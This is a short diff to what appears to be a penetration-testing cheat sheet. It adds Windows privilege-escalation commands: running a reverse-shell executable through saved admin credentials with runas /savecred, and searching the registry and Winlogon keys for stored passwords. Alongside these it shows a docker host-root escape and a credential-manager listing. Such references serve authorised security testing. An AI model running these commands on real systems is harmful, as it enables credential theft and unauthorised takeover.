@@ -417,9 +417,17 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```bash
 # List passwords in credential manager
 cmdkey /list
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
 # Search for string in
 findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml
+
+# Search registry for passwords
+reg query HKLM /f password /t REG_SZ /s
+
+# Autologon credentials
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
 ```
 ```bash
 # Lists user privileges
